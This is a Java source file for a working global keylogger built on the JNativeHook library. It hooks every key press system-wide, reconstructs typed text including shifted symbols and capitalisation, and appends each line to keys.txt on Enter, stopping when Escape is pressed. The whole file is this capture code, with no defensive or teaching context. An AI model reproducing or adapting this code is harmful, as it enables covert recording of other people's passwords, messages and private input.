import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import java.io.BufferedWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;


public class KeyListener implements NativeKeyListener {
    public String filename = "keys.txt";
    StringBuilder sb = new StringBuilder();



    KeyListener() {

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
        int code = nativeEvent.getKeyCode();
        String text = NativeKeyEvent.getKeyText(code);
        int modifier = nativeEvent.getModifiers();

        boolean caps = (modifier & NativeKeyEvent.CAPS_LOCK_MASK ) !=0;
        boolean shift  = (modifier & NativeKeyEvent.SHIFT_MASK) !=0;


        String specialChar = null;
        if(code==NativeKeyEvent.VC_ENTER){
            sb.append("\n");
            safeToFile(sb);
        } else if (code==NativeKeyEvent.VC_SPACE) {
            sb.append(" ");
        }else if(code ==NativeKeyEvent.VC_BACKSPACE){
            if(sb.length()>0){
                sb.deleteCharAt(sb.length()-1);
            }
        }else {
            specialChar = null;
            if(shift){
                switch (code) {
                    case NativeKeyEvent.VC_1: specialChar = "!"; break;
                    case NativeKeyEvent.VC_2: specialChar = "@"; break;
                    case NativeKeyEvent.VC_3: specialChar = "#"; break;
                    case NativeKeyEvent.VC_4: specialChar = "$"; break;
                    case NativeKeyEvent.VC_5: specialChar = "%"; break;
                    case NativeKeyEvent.VC_6: specialChar = "^"; break;
                    case NativeKeyEvent.VC_7: specialChar = "&"; break;
                    case NativeKeyEvent.VC_8: specialChar = "*"; break;
                    case NativeKeyEvent.VC_9: specialChar = "("; break;
                    case NativeKeyEvent.VC_0: specialChar = ")"; break;
                    case NativeKeyEvent.VC_SLASH: specialChar = "?"; break;
                    case NativeKeyEvent.VC_OPEN_BRACKET: specialChar = "{"; break;
                    case NativeKeyEvent.VC_CLOSE_BRACKET: specialChar = "}"; break;
                    case NativeKeyEvent.VC_SEMICOLON: specialChar = ":"; break;
                    case NativeKeyEvent.VC_QUOTE: specialChar = "\""; break;
                    case NativeKeyEvent.VC_COMMA: specialChar = "<"; break;
                    case NativeKeyEvent.VC_PERIOD: specialChar = ">"; break;
                    case NativeKeyEvent.VC_MINUS: specialChar = "_"; break;
                    case NativeKeyEvent.VC_EQUALS: specialChar = "+"; break;
                    case NativeKeyEvent.VC_BACKQUOTE: specialChar = "~"; break;
                }
            }else {
                switch (code) {
                    case NativeKeyEvent.VC_1: specialChar = "1"; break;
                    case NativeKeyEvent.VC_2: specialChar = "2"; break;
                    case NativeKeyEvent.VC_3: specialChar = "3"; break;
                    case NativeKeyEvent.VC_4: specialChar = "4"; break;
                    case NativeKeyEvent.VC_5: specialChar = "5"; break;
                    case NativeKeyEvent.VC_6: specialChar = "6"; break;
                    case NativeKeyEvent.VC_7: specialChar = "7"; break;
                    case NativeKeyEvent.VC_8: specialChar = "8"; break;
                    case NativeKeyEvent.VC_9: specialChar = "9"; break;
                    case NativeKeyEvent.VC_0: specialChar = "0"; break;
                    case NativeKeyEvent.VC_SLASH: specialChar = "/"; break;
                    case NativeKeyEvent.VC_OPEN_BRACKET: specialChar = "["; break;
                    case NativeKeyEvent.VC_CLOSE_BRACKET: specialChar = "]"; break;
                    case NativeKeyEvent.VC_SEMICOLON: specialChar = ";"; break;
                    case NativeKeyEvent.VC_QUOTE: specialChar = "\'"; break;
                    case NativeKeyEvent.VC_COMMA: specialChar = ","; break;
                    case NativeKeyEvent.VC_PERIOD: specialChar = "."; break;
                    case NativeKeyEvent.VC_MINUS: specialChar = "-"; break;
                    case NativeKeyEvent.VC_EQUALS: specialChar = "="; break;
                    case NativeKeyEvent.VC_BACK_SLASH: specialChar = "\\"; break;
                    case NativeKeyEvent.VC_BACKQUOTE: specialChar = "`"; break;


                }


            }
        }
        if(specialChar!=null){
            sb.append(specialChar);

        } else if (text.length()==1) {
            if(caps ^ shift){
                sb.append(text.toUpperCase());
            }else {
                sb.append(text.toLowerCase());
            }

        }




        if(text.equals("Escape")) {
            System.out.println("Koniec programu");
            safeToFile(sb);

            System.exit(0);
        }



    }
    public void safeToFile(StringBuilder sb){
        try (BufferedWriter writer = Files.newBufferedWriter(Paths.get(filename), StandardOpenOption.CREATE, StandardOpenOption.APPEND)){
            writer.write(sb.toString());
        }catch (IOException e){

        }
        sb.setLength(0);

    }

}
